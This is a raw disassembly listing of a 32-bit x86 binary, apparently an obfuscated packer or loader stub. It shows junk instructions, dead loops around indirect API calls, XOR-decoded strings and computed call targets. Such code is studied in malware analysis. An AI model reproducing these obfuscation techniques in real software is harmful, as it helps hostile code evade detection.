  42353d:	mov    eax,DWORD PTR [ebp-0x4]
  423540:	and    DWORD PTR ds:0x42862f,0x0
  42354a:	jmp    0x42355c
  42354f:	mov    ecx,DWORD PTR ds:0x42862f
  423555:	inc    ecx
  423556:	mov    DWORD PTR ds:0x42862f,ecx
  42355c:	cmp    DWORD PTR ds:0x42862f,0x19
  423563:	jae    0x42358e
  423569:	cmp    DWORD PTR ds:0x42862f,0x22
  423570:	ja     0x42358e
  423576:	jmp    0x423589
  42357b:	push   DWORD PTR [ebp-0x28]
  42357e:	push   0x428028
  423583:	call   DWORD PTR ds:0x4287a7
  423589:	jmp    0x42354f
  42358e:	mov    edi,DWORD PTR [ebp-0x8]
  423591:	mov    ecx,0x75108a4
  423596:	xor    eax,ecx
  423598:	sbb    edx,DWORD PTR ds:0x428637
  42359e:	xor    edi,ecx
  4235a0:	mov    edx,0x3272ec
  4235a5:	add    edi,edx
  4235a7:	mov    DWORD PTR ds:0x42861b,0x1914
  4235b1:	add    eax,edx
  4235b3:	mov    DWORD PTR ds:0x42863b,0x6a3e
  4235bd:	imul   eax,edi
  4235c0:	mov    DWORD PTR ds:0x428613,ebx
  4235c6:	mov    edi,DWORD PTR [ebp+0xc]
  4235c9:	mov    DWORD PTR ds:0x428647,0x7cb7
  4235d3:	cmp    edi,eax
  4235d5:	je     0x42362c
  4235db:	not    eax
  4235dd:	mov    DWORD PTR [ebp-0xc],esi
  4235e0:	mov    eax,DWORD PTR [ebp-0xc]
  4235e3:	mov    esi,DWORD PTR [ebp+0xc]
  4235e6:	xor    eax,ecx
  4235e8:	lea    eax,[eax*8+0x19397d8]
  4235ef:	mov    eax,DWORD PTR [esi+eax*1]
  4235f2:	mov    DWORD PTR [ebp+0xc],eax
  4235f5:	mov    eax,DWORD PTR [ebp-0x4]
  4235f8:	mov    esi,DWORD PTR [ebp-0x8]
  4235fb:	xor    eax,ecx
  4235fd:	xor    esi,ecx
  4235ff:	add    esi,edx
  423601:	add    eax,edx
  423603:	imul   eax,esi
  423606:	mov    esi,DWORD PTR [ebp+0xc]
  423609:	cmp    esi,eax
  42360b:	je     0x42362c
  423611:	mov    eax,DWORD PTR [ebp-0x4]
  423614:	xor    eax,ecx
  423616:	mov    ecx,DWORD PTR [ebp+0xc]
  423619:	add    eax,edx
  42361b:	imul   eax,ecx
  42361e:	add    eax,DWORD PTR [ebp+0x8]
  423621:	mov    DWORD PTR [ebp+0xc],eax
  423624:	mov    eax,DWORD PTR [ebp+0xc]
  423627:	jmp    0x42363d
  42362c:	mov    eax,DWORD PTR [ebp-0x4]
  42362f:	mov    esi,DWORD PTR [ebp-0x8]
  423632:	xor    esi,ecx
  423634:	xor    eax,ecx
  423636:	add    esi,edx
  423638:	add    eax,edx
  42363a:	imul   eax,esi
  42363d:	pop    edi
  42363e:	pop    esi
  42363f:	leave  
  423640:	ret    0x8
  423643:	push   ebp
  423644:	mov    ebp,esp
  423646:	sub    esp,0x38
  423649:	mov    DWORD PTR [ebp-0x4],0xf89c85b0
  423650:	sub    DWORD PTR ds:0x428607,edi
  423656:	push   ebx
  423657:	adc    DWORD PTR ds:0x4285d3,0x5ead
  423661:	mov    DWORD PTR [ebp-0xc],0xf89c85b1
  423668:	mov    eax,DWORD PTR [ebp-0x4]
  42366b:	push   esi
  42366c:	movzx  esi,WORD PTR ds:0x42865f
  423673:	or     esi,DWORD PTR ds:0x428643
  423679:	mov    DWORD PTR ds:0x42865f,esi
  42367f:	mov    esi,0x75108a4
  423684:	xor    eax,esi
  423686:	push   edi
  423687:	movzx  edi,WORD PTR ds:0x42862f
  42368e:	add    edi,DWORD PTR ds:0x4285d3
  423694:	mov    DWORD PTR ds:0x42862f,edi
  42369a:	mov    edi,0x3272ec
  42369f:	add    eax,edi
  4236a1:	and    DWORD PTR ds:0x42864f,0x1fff
  4236ab:	mov    DWORD PTR [ebp-0x1c],eax
  4236ae:	mov    eax,ds:0x4285d7
  4236b3:	sbb    DWORD PTR ds:0x42866b,eax
  4236b9:	mov    eax,DWORD PTR [ebp+0x14]
  4236bc:	test   eax,eax
  4236be:	mov    DWORD PTR ds:0x42861b,0x61b5
  4236c8:	je     0x4236d8
  4236ce:	xor    eax,eax
  4236d0:	mov    eax,DWORD PTR [ebp+0x14]
  4236d3:	mov    eax,DWORD PTR [eax]
  4236d5:	mov    DWORD PTR [ebp-0x1c],eax
  4236d8:	and    DWORD PTR ds:0x42867b,ecx
  4236de:	mov    eax,DWORD PTR [ebp-0x4]
  4236e1:	xor    eax,esi
  4236e3:	adc    DWORD PTR ds:0x4285eb,edx
  4236e9:	add    eax,edi
  4236eb:	and    DWORD PTR ds:0x4285eb,ecx
  4236f1:	mov    DWORD PTR [ebp-0x8],eax
  4236f4:	xor    eax,eax
  4236f6:	mov    eax,DWORD PTR [ebp-0xc]
  4236f9:	sub    DWORD PTR ds:0x428607,0x2824
  423703:	xor    eax,esi
  423705:	or     DWORD PTR ds:0x428663,0xb3a
  42370f:	add    eax,edi
  423711:	sub    DWORD PTR ds:0x428617,edx
  423717:	mov    DWORD PTR [ebp-0x24],eax
  42371a:	mov    ebx,DWORD PTR ds:0x428667
  423720:	and    DWORD PTR ds:0x428603,ebx
  423726:	mov    eax,DWORD PTR [ebp-0x4]
  423729:	xor    eax,esi
  42372b:	add    eax,edi
  42372d:	and    DWORD PTR ds:0x428637,0x0
  423737:	mov    ebx,DWORD PTR ds:0x428637
  42373d:	inc    ebx
  42373e:	mov    DWORD PTR ds:0x428637,ebx
  423744:	cmp    DWORD PTR ds:0x428637,0x23
  42374b:	ja     0x423774
  423751:	jmp    0x423767
  423756:	push   0x428070
  42375b:	push   DWORD PTR [ebp-0x14]
  42375e:	push   DWORD PTR [ebp-0x14]
  423761:	call   DWORD PTR ds:0x4287ab
  423767:	cmp    DWORD PTR ds:0x428637,0x17
  42376e:	jb     0x423737
  423774:	mov    DWORD PTR [ebp-0x30],eax
  423777:	mov    ebx,DWORD PTR [ebp-0x4]
  42377a:	xor    ebx,esi
  42377c:	add    ebx,edi
  42377e:	adc    eax,DWORD PTR ds:0x428673
  423784:	mov    eax,DWORD PTR [ebp-0x24]
  423787:	sub    eax,edi
  423789:	lea    ecx,[ebx-0x3272ec]
  42378f:	add    DWORD PTR ds:0x42861f,0x137d
  423799:	xor    eax,esi
  42379b:	adc    DWORD PTR ds:0x428667,0x428613
  4237a5:	xor    ecx,esi
  4237a7:	cmp    ecx,eax
  4237a9:	je     0x423ace
  4237af:	and    DWORD PTR ds:0x428667,0x0
  4237b9:	mov    eax,ds:0x428667
  4237be:	inc    eax
  4237bf:	mov    ds:0x428667,eax
  4237c4:	cmp    DWORD PTR ds:0x428667,0x22
  4237cb:	jge    0x4237ee
  4237d1:	jmp    0x4237e1
  4237d6:	push   0x428056
  4237db:	call   DWORD PTR ds:0x4287af
  4237e1:	cmp    DWORD PTR ds:0x428667,0x14
  4237e8:	jb     0x4237b9
  4237ee:	mov    eax,DWORD PTR [ebp-0x4]
  4237f1:	add    DWORD PTR ds:0x42862b,0x428657
  4237fb:	xor    eax,esi
  4237fd:	add    eax,edi
  4237ff:	mov    DWORD PTR ds:0x42863b,0x5900
  423809:	cmp    ebx,eax
  42380b:	mov    DWORD PTR ds:0x42864b,0x1e0f
  423815:	jne    0x423a1c
  42381b:	sbb    DWORD PTR ds:0x42866f,0x4285df
  423825:	push   DWORD PTR [ebp+0x8]
  423828:	sub    DWORD PTR ds:0x428653,0x2050
  423832:	call   0x42340e
  423837:	mov    DWORD PTR [ebp-0x14],eax
  42383a:	mov    eax,DWORD PTR [ebp-0x4]
  42383d:	xor    DWORD PTR ds:0x428603,0x42865b
  423847:	mov    ecx,DWORD PTR [ebp-0x14]
  42384a:	sbb    DWORD PTR ds:0x42866f,0x5022
  423854:	xor    eax,esi
  423856:	adc    DWORD PTR ds:0x42867b,0x428657
  423860:	add    eax,edi
  423862:	mov    DWORD PTR ds:0x4285e7,0x3cb8
  42386c:	cmp    ecx,eax
  42386e:	je     0x423bb1
  423874:	sbb    DWORD PTR ds:0x4285ef,0x428613
  42387e:	push   DWORD PTR [ebp-0x14]
  423881:	or     DWORD PTR ds:0x42866b,0x13a4
  42388b:	push   DWORD PTR [ebp+0x8]
  42388e:	and    DWORD PTR ds:0x4285cf,0x6488
  423898:	call   0x4234ce
  42389d:	mov    DWORD PTR [ebp-0x14],eax
  4238a0:	mov    ecx,DWORD PTR ds:0x4286c7
  4238a6:	mov    eax,ds:0x4286ff
  4238ab:	sub    ecx,eax
  4238ad:	sub    ecx,DWORD PTR [ecx+eax*1]
  4238b0:	mov    eax,DWORD PTR [ebp-0x4]
  4238b3:	mov    DWORD PTR ds:0x4285e3,0x1e
  4238bd:	cmp    DWORD PTR ds:0x4285e3,0x0
  4238c4:	je     0x4238fe
  4238ca:	cmp    DWORD PTR ds:0x4285e3,0x27
  4238d1:	ja     0x4238fe
  4238d7:	jmp    0x4238ec
  4238dc:	push   0x4c54
  4238e1:	push   0x42862f
  4238e6:	call   DWORD PTR ds:0x4287b3
  4238ec:	mov    ecx,DWORD PTR ds:0x4285e3
  4238f2:	dec    ecx
  4238f3:	mov    DWORD PTR ds:0x4285e3,ecx
  4238f9:	jmp    0x4238bd
  4238fe:	mov    ecx,DWORD PTR [ebp-0x14]
  423901:	mov    DWORD PTR ds:0x4285f3,0x1814
  42390b:	xor    eax,esi
  42390d:	add    DWORD PTR ds:0x428657,0x428637
  423917:	add    eax,edi
  423919:	mov    DWORD PTR ds:0x42863f,0xaaa
  423923:	cmp    ecx,eax
  423925:	mov    DWORD PTR ds:0x42860f,0x626d
  42392f:	je     0x423bb1
  423935:	mov    eax,DWORD PTR [ebp-0x14]
  423938:	or     ecx,0x1da9
  42393e:	mov    eax,DWORD PTR [eax+0x18]
  423941:	sub    DWORD PTR ds:0x42865b,ecx
  423947:	mov    DWORD PTR [ebp-0x24],eax
  42394a:	and    eax,0x4d45
  42394f:	mov    eax,DWORD PTR [ebp-0x14]
  423952:	adc    ecx,0x37bd
  423958:	mov    ecx,DWORD PTR [ebp+0x8]
  42395b:	add    ecx,DWORD PTR [eax+0x20]
  42395e:	movzx  eax,WORD PTR ds:0x4285d3
  423965:	sbb    DWORD PTR ds:0x428657,eax
  42396b:	mov    DWORD PTR [ebp-0x2c],ecx
  42396e:	and    DWORD PTR ds:0x428627,0x1b49
  423978:	mov    eax,DWORD PTR [ebp-0x14]
  42397b:	mov    ecx,DWORD PTR [ebp+0x8]
  42397e:	and    DWORD PTR ds:0x4285db,0x4285ef
  423988:	add    ecx,DWORD PTR [eax+0x24]
  42398b:	adc    DWORD PTR ds:0x4285e3,0x7baf
  423995:	mov    DWORD PTR [ebp-0x34],ecx
  423998:	and    DWORD PTR ds:0x428623,0x0
  4239a2:	jmp    0x4239b5
  4239a7:	xor    eax,eax
  4239a9:	xor    eax,DWORD PTR ds:0x428623
  4239af:	inc    eax
  4239b0:	mov    ds:0x428623,eax
  4239b5:	cmp    DWORD PTR ds:0x428623,0x1a
  4239bc:	jae    0x4239f7
  4239c2:	cmp    DWORD PTR ds:0x428623,0xd
  4239c9:	jb     0x4239f7
  4239cf:	jmp    0x4239da
  4239d4:	call   DWORD PTR ds:0x4287b7
  4239da:	cmp    DWORD PTR ds:0x428623,0xc
  4239e1:	jne    0x4239f2
  4239e7:	mov    eax,ds:0x428623
  4239ec:	inc    eax
  4239ed:	mov    ds:0x428623,eax
  4239f2:	jmp    0x4239a7
  4239f7:	mov    eax,DWORD PTR [ebp-0x14]
  4239fa:	mov    ecx,DWORD PTR [ebp+0x8]
  4239fd:	xor    DWORD PTR ds:0x428603,0x1ba
  423a07:	add    ecx,DWORD PTR [eax+0x1c]
  423a0a:	mov    DWORD PTR [ebp-0x14],ecx
  423a0d:	mov    DWORD PTR ds:0x4285df,0x6d54
  423a17:	jmp    0x423b6f
  423a1c:	sbb    DWORD PTR ds:0x428657,0x267e
  423a26:	mov    eax,DWORD PTR [ebp-0x2c]
  423a29:	and    DWORD PTR ds:0x42865f,0x0
  423a33:	mov    ecx,DWORD PTR ds:0x42865f
  423a39:	inc    ecx
  423a3a:	mov    DWORD PTR ds:0x42865f,ecx
  423a40:	cmp    DWORD PTR ds:0x42865f,0x24
  423a47:	jl     0x423a6a
  423a4d:	jmp    0x423a5d
  423a52:	push   0x3051
  423a57:	call   DWORD PTR ds:0x4287bb
  423a5d:	cmp    DWORD PTR ds:0x42865f,0x1e
  423a64:	jb     0x423a33
  423a6a:	mov    ecx,DWORD PTR [ebp+0x8]
  423a6d:	add    DWORD PTR ds:0x428617,0x4285ef
  423a77:	add    ecx,DWORD PTR [eax+ebx*4]
  423a7a:	movzx  eax,BYTE PTR ds:0x4285d3
  423a81:	or     eax,DWORD PTR ds:0x428633
  423a87:	mov    ds:0x4285d3,eax
  423a8c:	mov    DWORD PTR [ebp-0x28],ecx
  423a8f:	mov    eax,DWORD PTR [ebp-0x4]
  423a92:	xor    DWORD PTR ds:0x42860b,0x227b
  423a9c:	mov    ecx,DWORD PTR [ebp-0x28]
  423a9f:	mov    DWORD PTR ds:0x428657,0x956
  423aa9:	xor    eax,esi
  423aab:	add    DWORD PTR ds:0x428637,0x428663
  423ab5:	add    eax,edi
  423ab7:	mov    DWORD PTR ds:0x42862f,0x1972
  423ac1:	cmp    ecx,eax
  423ac3:	je     0x423b6f
  423ac9:	jmp    0x423b2e
  423ace:	mov    eax,DWORD PTR [ebp-0x4]
  423ad1:	mov    DWORD PTR ds:0x42866f,0x10fc
  423adb:	mov    ecx,DWORD PTR [ebp-0x8]
  423ade:	or     DWORD PTR ds:0x42866f,0x42865f
  423ae8:	xor    eax,esi
  423aea:	adc    DWORD PTR ds:0x4285eb,0x240b
  423af4:	add    eax,edi
  423af6:	mov    DWORD PTR ds:0x428657,0x63ac
  423b00:	cmp    ecx,eax
  423b02:	mov    eax,DWORD PTR [ebp-0x4]
  423b05:	je     0x423bb4
  423b0b:	mov    ecx,DWORD PTR [ebp-0x30]
  423b0e:	xor    eax,esi
  423b10:	mov    DWORD PTR ds:0x428613,0x1e55
  423b1a:	add    eax,edi
  423b1c:	mov    DWORD PTR ds:0x428637,0x6483
  423b26:	cmp    ecx,eax
  423b28:	je     0x423bbd
  423b2e:	adc    DWORD PTR ds:0x428603,0x42865b
  423b38:	lea    eax,[ebp-0x8]
  423b3b:	sub    DWORD PTR ds:0x428603,0x42860b
  423b45:	push   eax
  423b46:	sbb    DWORD PTR ds:0x42861b,0x4285f7
  423b50:	push   DWORD PTR [ebp-0x28]
  423b53:	sub    DWORD PTR ds:0x428617,0x428667
  423b5d:	push   DWORD PTR [ebp+0xc]
  423b60:	adc    DWORD PTR ds:0x42863f,0x428633
  423b6a:	call   0x40f467
  423b6f:	sub    DWORD PTR ds:0x4285d7,0x3834
  423b79:	mov    eax,DWORD PTR [ebp-0x4]
  423b7c:	mov    ecx,DWORD PTR [ebp-0x8]
  423b7f:	xor    eax,esi
  423b81:	add    eax,edi
  423b83:	cmp    ecx,eax
  423b85:	je     0x423ba0
  423b8b:	mov    eax,DWORD PTR [ebp-0x34]
  423b8e:	movzx  eax,WORD PTR [eax+ebx*2]
  423b92:	mov    ecx,DWORD PTR [ebp-0x14]
  423b95:	mov    eax,DWORD PTR [ecx+eax*4]
  423b98:	mov    DWORD PTR [ebp-0x38],eax
  423b9b:	jmp    0x423ace
  423ba0:	mov    eax,DWORD PTR [ebp-0xc]
  423ba3:	xor    eax,esi
  423ba5:	lea    ebx,[ebx+eax*1+0x3272ec]
  423bac:	jmp    0x42377e
  423bb1:	mov    eax,DWORD PTR [ebp-0x4]
  423bb4:	xor    eax,esi
  423bb6:	add    eax,edi
  423bb8:	jmp    0x423cda
  423bbd:	mov    eax,DWORD PTR [ebp-0x38]
  423bc0:	add    eax,DWORD PTR [ebp+0x8]
  423bc3:	mov    DWORD PTR [ebp-0x18],eax
  423bc6:	mov    eax,DWORD PTR [ebp-0x1c]
  423bc9:	test   eax,eax
  423bcb:	je     0x423c65
  423bd1:	mov    DWORD PTR [ebp-0x20],0x0
  423bd8:	push   0x3
  423bda:	xor    edx,edx
  423bdc:	pop    edx
  423bdd:	add    edx,0x8
  423be0:	push   edx
  423be1:	pop    ecx
  423be2:	push   0x6
  423be4:	dec    ecx
  423be5:	pop    ebx
  423be6:	dec    ebx
  423be7:	xchg   ebx,ecx
  423be9:	sub    ebx,ecx
  423beb:	xchg   ebx,ecx
  423bed:	dec    ecx
  423bee:	mov    eax,DWORD PTR [ebp-0x1c]
  423bf1:	imul   eax,ecx
  423bf4:	sub    esp,eax
  423bf6:	mov    DWORD PTR [ebp-0x20],esp
  423bf9:	mov    eax,DWORD PTR [ebp-0x4]
  423bfc:	xor    eax,esi
  423bfe:	add    eax,edi
  423c00:	jmp    0x423c3e
  423c05:	mov    ecx,DWORD PTR [ebp-0xc]
  423c08:	mov    eax,DWORD PTR [ebp+0x8]
  423c0b:	mov    edx,DWORD PTR [ebp+0x14]
  423c0e:	mov    eax,DWORD PTR [edx+eax*4+0x4]
  423c12:	xor    ecx,esi
  423c14:	add    ecx,edi
  423c16:	xor    edx,edx
  423c18:	div    ecx
  423c1a:	mov    ecx,DWORD PTR [ebp-0x4]
  423c1d:	xor    ecx,esi
  423c1f:	lea    eax,[ecx+eax*1+0x3272ec]
  423c26:	mov    ecx,DWORD PTR [ebp+0x8]
  423c29:	mov    edx,DWORD PTR [ebp-0x20]
  423c2c:	mov    DWORD PTR [edx+ecx*4],eax
  423c2f:	mov    eax,DWORD PTR [ebp-0xc]
  423c32:	mov    ecx,DWORD PTR [ebp+0x8]
  423c35:	xor    eax,esi
  423c37:	lea    eax,[eax+ecx*1+0x3272ec]
  423c3e:	mov    DWORD PTR [ebp+0x8],eax
  423c41:	mov    eax,DWORD PTR [ebp-0xc]
  423c44:	mov    ecx,DWORD PTR [ebp+0x14]
  423c47:	xor    eax,esi
  423c49:	add    eax,edi
  423c4b:	imul   eax,DWORD PTR [ecx]
  423c4e:	mov    ecx,DWORD PTR [ebp-0x4]
  423c51:	mov    edx,DWORD PTR [ebp+0x8]
  423c54:	xor    ecx,esi
  423c56:	lea    ecx,[ecx+edx*1+0x3272ec]
  423c5d:	cmp    ecx,eax
  423c5f:	jne    0x423c05
  423c65:	mov    eax,DWORD PTR [ebp-0x4]
  423c68:	xor    eax,esi
  423c6a:	add    eax,edi
  423c6c:	mov    DWORD PTR [ebp-0x10],eax
  423c6f:	mov    ebx,0x65655
  423c74:	add    ebx,0x3234
  423c7a:	xchg   ebx,esi
  423c7c:	xor    ebx,ebx
  423c7e:	push   esi
  423c7f:	mov    esi,ebx
  423c81:	pop    ebx
  423c82:	mov    edx,esi
  423c84:	add    ebx,0x1002
  423c8a:	lea    eax,[ebp-0x18]
  423c8d:	add    edx,eax
  423c8f:	add    edx,0x5
  423c92:	push   edx
  423c93:	inc    esi
  423c94:	pop    ecx
  423c95:	dec    ecx
  423c96:	xchg   ecx,eax
  423c97:	dec    eax
  423c98:	xchg   ecx,eax
  423c99:	dec    ecx
  423c9a:	xchg   ecx,edx
  423c9c:	dec    edx
  423c9d:	push   edx
  423c9e:	mov    edx,ebx
  423ca0:	pop    ebx
  423ca1:	dec    ebx
  423ca2:	call   DWORD PTR [ebx]
  423ca4:	cmp    DWORD PTR [ebp+0x10],esi
  423ca7:	je     0x423cc6
  423cad:	xchg   edx,eax
  423cae:	push   0xb
  423cb0:	pop    ecx
  423cb1:	push   0x4
  423cb3:	pop    ebx
  423cb4:	inc    ebx
  423cb5:	xchg   ebx,ecx
  423cb7:	sub    ebx,ecx
  423cb9:	xchg   ebx,ecx
  423cbb:	dec    ecx
  423cbc:	dec    ecx
  423cbd:	mov    eax,DWORD PTR [ebp-0x1c]
  423cc0:	imul   eax,ecx
  423cc3:	add    esp,eax
  423cc5:	xchg   edx,eax
  423cc6:	push   eax
  423cc7:	xor    ebx,ebx
  423cc9:	mov    edx,esp
  423ccb:	dec    edx
  423ccc:	inc    ebx
  423ccd:	add    ebx,DWORD PTR [edx+ebx*1]
  423cd0:	dec    ebx
  423cd1:	xor    edx,edx
  423cd3:	add    DWORD PTR [ebp-0x10],ebx
  423cd6:	pop    ebx
  423cd7:	mov    eax,DWORD PTR [ebp-0x10]
  423cda:	pop    edi
  423cdb:	pop    esi
  423cdc:	pop    ebx
  423cdd:	leave  
  423cde:	ret    0x10
	...
  423cf1:	add    BYTE PTR [eax],al
  423cf3:	add    BYTE PTR [ebx+0x4df68a],dh
  423cf9:	add    BYTE PTR [eax],al
  423cfb:	add    BYTE PTR [edx],al
  423cfd:	add    BYTE PTR [eax],al
  423cff:	add    BYTE PTR [eax+eax*1],dh
  423d02:	add    BYTE PTR [eax],al
  423d04:	adc    BYTE PTR ds:0x31100002,bh
  423d0a:	add    al,BYTE PTR [eax]
  423d0c:	add    BYTE PTR [eax],al
  423d0e:	add    BYTE PTR [eax],al
  423d10:	push   edx
  423d11:	push   ebx
  423d12:	inc    esp
  423d13:	push   ebx
  423d14:	(bad)  
  423d15:	sti    
  423d16:	ins    BYTE PTR es:[edi],dx
  423d17:	repnz test DWORD PTR [eax+0xa9246f4],esp
  423d1e:	(bad)  
  423d1f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423d20:	jo     0x423d99
  423d22:	fst    QWORD PTR [ebp+0x1]
  423d28:	inc    ebp
  423d29:	cmp    bl,BYTE PTR [edx+edx*2+0x61]
  423d2d:	ja     0x423d4f
  423d2f:	inc    esp
  423d30:	popa   
  423d31:	je     0x423d94
  423d33:	pop    esp
  423d34:	inc    ebp
  423d35:	outs   dx,BYTE PTR ds:[esi]
  423d36:	arpl   WORD PTR [edi+0x64],bp
  423d39:	gs fs inc esp
  423d3c:	popa   
  423d3d:	je     0x423da0
  423d3f:	inc    esi
  423d40:	imul   ebp,DWORD PTR [ebp+eiz*2+0x0],0x81ec558b
  423d48:	in     al,dx
  423d49:	or     BYTE PTR [ecx],al
  423d4b:	add    BYTE PTR [eax],al
  423d4d:	push   ebx
  423d4e:	mov    eax,ebx
  423d50:	xchg   ecx,eax
  423d51:	mov    eax,DWORD PTR [ebp+0x8]
  423d54:	cmp    eax,0xf89c85b0
  423d59:	jne    0x4241e0
  423d5f:	mov    eax,DWORD PTR [ebp+0xc]
  423d62:	cmp    eax,0xf89c85b1
  423d67:	jne    0x4241e0
  423d6d:	mov    eax,DWORD PTR [ebp+0x24]
  423d70:	mov    DWORD PTR [ebp-0x4],eax
  423d73:	mov    BYTE PTR [ebp-0x18],0x13
  423d77:	mov    BYTE PTR [ebp-0x17],0x1e
  423d7b:	mov    BYTE PTR [ebp-0x16],0x15
  423d7f:	mov    BYTE PTR [ebp-0x15],0x4f
  423d83:	mov    BYTE PTR [ebp-0x14],0x4c
  423d87:	mov    BYTE PTR [ebp-0x13],0x7a
  423d8b:	mov    BYTE PTR [ebp-0x20],0x1
  423d8f:	mov    BYTE PTR [ebp-0x1f],0xf
  423d93:	mov    BYTE PTR [ebp-0x1e],0x11
  423d97:	mov    BYTE PTR [ebp-0x1d],0xc
  423d9b:	mov    BYTE PTR [ebp-0x1c],0x4f
  423d9f:	mov    BYTE PTR [ebp-0x1b],0x4c
  423da3:	mov    BYTE PTR [ebp-0x1a],0x7a
  423da7:	mov    BYTE PTR [ebp-0x28],0xf
  423dab:	mov    BYTE PTR [ebp-0x27],0x12
  423daf:	mov    BYTE PTR [ebp-0x26],0x16
  423db3:	mov    BYTE PTR [ebp-0x25],0x3
  423db7:	mov    BYTE PTR [ebp-0x24],0x1d
  423dbb:	mov    BYTE PTR [ebp-0x23],0xa
  423dbf:	push   esi
  423dc0:	mov    BYTE PTR [ebp-0x22],0x15
  423dc4:	mov    BYTE PTR [ebp-0x21],0x7a
  423dc8:	xor    esi,esi
  423dca:	mov    eax,0xfd
  423dcf:	lea    ecx,[ebp+esi*1-0x18]
  423dd3:	movzx  edx,BYTE PTR [ecx]
  423dd6:	xor    edx,0x79
  423dd9:	add    edx,eax
  423ddb:	inc    esi
  423ddc:	mov    BYTE PTR [ecx],dl
  423dde:	cmp    esi,0x6
  423de1:	jb     0x423dcf
  423de3:	xor    esi,esi
  423de5:	lea    ecx,[ebp+esi*1-0x20]
  423de9:	movzx  edx,BYTE PTR [ecx]
  423dec:	xor    edx,0x79
  423def:	add    edx,eax
  423df1:	inc    esi
  423df2:	mov    BYTE PTR [ecx],dl
  423df4:	cmp    esi,0x7
  423df7:	jb     0x423de5
  423df9:	xor    esi,esi
  423dfb:	lea    ecx,[ebp+esi*1-0x28]
  423dff:	movzx  edx,BYTE PTR [ecx]
  423e02:	xor    edx,0x79
  423e05:	add    edx,eax
  423e07:	inc    esi
  423e08:	mov    BYTE PTR [ecx],dl
  423e0a:	cmp    esi,0x8
  423e0d:	jb     0x423dfb
  423e0f:	lea    eax,[ebp-0x2c]
  423e12:	mov    DWORD PTR [ebp-0x8],eax
  423e15:	mov    ecx,DWORD PTR [ebp-0x8]
  423e18:	mov    eax,0x7113fcce
  423e1d:	mov    DWORD PTR [ecx],eax
  423e1f:	mov    ecx,DWORD PTR [ebp-0x2c]
  423e22:	push   edi
  423e23:	mov    esi,0x4e3e
  423e28:	mov    ebx,0x3272ec
  423e2d:	cmp    ecx,eax
  423e2f:	jne    0x423efa
  423e35:	lea    eax,[esi+0x29]
  423e38:	mov    WORD PTR [ebp-0x78],ax
  423e3c:	mov    eax,esi
  423e3e:	mov    WORD PTR [ebp-0x76],ax
  423e42:	add    eax,0x3b
  423e45:	mov    WORD PTR [ebp-0x74],ax
  423e49:	lea    eax,[esi-0x6]
  423e4c:	mov    WORD PTR [ebp-0x72],ax
  423e50:	add    eax,0x47
  423e53:	mov    ecx,eax
  423e55:	lea    eax,[esi-0x1d]
  423e58:	mov    WORD PTR [ebp-0x66],ax
  423e5c:	mov    eax,esi
  423e5e:	mov    WORD PTR [ebp-0x64],ax
  423e62:	add    eax,0xffffffe4
  423e65:	mov    WORD PTR [ebp-0x62],ax
  423e69:	mov    eax,0x44b
  423e6e:	mov    WORD PTR [ebp-0x60],ax
  423e72:	mov    eax,0x5664
  423e77:	mov    WORD PTR [ebp-0x5e],ax
  423e7b:	mov    eax,0x6104
  423e80:	mov    WORD PTR [ebp-0x5c],ax
  423e84:	lea    eax,[ebp-0xe0]
  423e8a:	push   eax
  423e8b:	mov    eax,DWORD PTR [ebp+0xc]
  423e8e:	mov    edi,0x75108a4
  423e93:	xor    eax,edi
  423e95:	add    eax,ebx
  423e97:	push   eax
  423e98:	mov    WORD PTR [ebp-0x70],cx
  423e9c:	lea    ecx,[esi-0x1a]
  423e9f:	mov    edx,ecx
  423ea1:	lea    eax,[ebp-0x78]
  423ea4:	push   eax
  423ea5:	mov    eax,DWORD PTR [ebp-0x4]
  423ea8:	mov    eax,DWORD PTR [eax+0x198]
  423eae:	mov    WORD PTR [ebp-0x6e],dx
  423eb2:	mov    edx,0x4f82
  423eb7:	mov    WORD PTR [ebp-0x6c],dx
  423ebb:	mov    DWORD PTR [ebp-0x6a],0x4e7f4e25
  423ec2:	mov    DWORD PTR [ebp-0x5a],0x4e24f116
  423ec9:	mov    DWORD PTR [ebp-0xe0],0x1
  423ed3:	mov    DWORD PTR [ebp-0xdc],0x255
  423edd:	push   DWORD PTR [eax]
  423edf:	mov    eax,DWORD PTR [ebp+0x10]
  423ee2:	call   eax
  423ee4:	mov    DWORD PTR [ebp-0x8],eax
  423ee7:	mov    eax,DWORD PTR [ebp-0x8]
  423eea:	test   eax,eax
  423eec:	je     0x423eff
  423eee:	xor    DWORD PTR ds:0x76586876,0x87687666
  423ef8:	jmp    0x423eff
  423efa:	mov    edi,0x75108a4
  423eff:	mov    eax,DWORD PTR [ebp-0x4]
  423f02:	mov    ecx,DWORD PTR [eax+0x18c]
  423f08:	xor    eax,eax
  423f0a:	cmp    DWORD PTR [ecx],eax
  423f0c:	jne    0x42417b
  423f12:	mov    ecx,DWORD PTR [ebp-0x4]
  423f15:	mov    ecx,DWORD PTR [ecx+0x17c]
  423f1b:	mov    DWORD PTR [ecx],eax
  423f1d:	mov    ecx,DWORD PTR [ebp-0x4]
  423f20:	mov    ecx,DWORD PTR [ecx+0x180]
  423f26:	mov    DWORD PTR [ecx],eax
  423f28:	mov    eax,0x4e69
  423f2d:	mov    WORD PTR [ebp-0x9c],ax
  423f34:	mov    eax,esi
  423f36:	mov    WORD PTR [ebp-0x9a],ax
  423f3d:	mov    eax,0x4e79
  423f42:	mov    WORD PTR [ebp-0x98],ax
  423f49:	add    eax,0xffffffc0
  423f4c:	mov    WORD PTR [ebp-0x96],ax
  423f53:	mov    eax,0x4f8e
  423f58:	mov    WORD PTR [ebp-0x94],ax
  423f5f:	mov    eax,0x4e3a
  423f64:	mov    WORD PTR [ebp-0x92],ax
  423f6b:	add    eax,0x45
  423f6e:	mov    WORD PTR [ebp-0x90],ax
  423f75:	mov    eax,0x4e24
  423f7a:	mov    WORD PTR [ebp-0x8e],ax
  423f81:	mov    eax,esi
  423f83:	mov    WORD PTR [ebp-0x8c],ax
  423f8a:	mov    eax,0x4e25
  423f8f:	mov    WORD PTR [ebp-0x8a],ax
  423f96:	mov    eax,0x99f9
  423f9b:	mov    WORD PTR [ebp-0x88],ax
  423fa2:	mov    eax,0x8d6a
  423fa7:	mov    WORD PTR [ebp-0x86],ax
  423fae:	mov    eax,0xd66f
  423fb3:	mov    WORD PTR [ebp-0x84],ax
  423fba:	mov    eax,0xd78b
  423fbf:	mov    WORD PTR [ebp-0x82],ax
  423fc6:	mov    eax,0x27b4
  423fcb:	mov    WORD PTR [ebp-0x80],ax
  423fcf:	mov    eax,0x47b4
  423fd4:	mov    WORD PTR [ebp-0x7e],ax
  423fd8:	mov    eax,0x4e3b
